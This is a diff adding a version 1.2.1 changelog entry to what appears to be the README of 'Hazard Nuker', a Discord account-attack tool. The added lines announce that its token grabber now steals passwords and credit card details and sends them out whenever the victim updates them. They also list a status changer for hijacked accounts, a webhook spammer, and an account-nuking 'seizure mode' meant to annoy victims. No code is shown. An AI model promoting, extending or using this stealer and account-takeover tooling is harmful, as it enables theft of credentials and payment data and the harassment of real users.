@@ -1,5 +1,16 @@
 <p align= center</p><a href="https://rdimo.github.io/CheatAway/" target="_blank"><img src="https://cdn.discordapp.com/attachments/853347983639052318/858485202157699092/Hazard_Nuker_Banner.png" alt="HazardNuker"></a>
 
+### 2021-9-1, v1.2.1
+* ` The token grabber now grabs password and creditcard info! The password will be sent over everytime the user updates the password/email or adds a cc (looks like this now https://imgur.com/bgDXl1F)`
+* ` New option! Status changer so you can change their status to whatever you want`
+* ` Added so you now see all the badges an account has when using option [7]`
+* ` Made option [8] faster and just better working`
+* ` Fixed so it now checks properly if you have pyinstaller installed and such`
+* ` Fixed the valid webhook checker since it kinda crashed when an invalid webhook url was given`
+* ` Fixed webhook spammer a bit, before the input in seconds would always add like +2-3sec`
+* ` Fixed so you get the correct avatar url now for the account when using option [7]`
+* ` Hazard nuker now downloads a chromedriver for you automatically`
+
 ### 2021-07-10, v1.2.0
 * ` New option to delete all the private dm channels`
 * ` Fixed so seizure mode is active while nuking the account so its even more annoying`
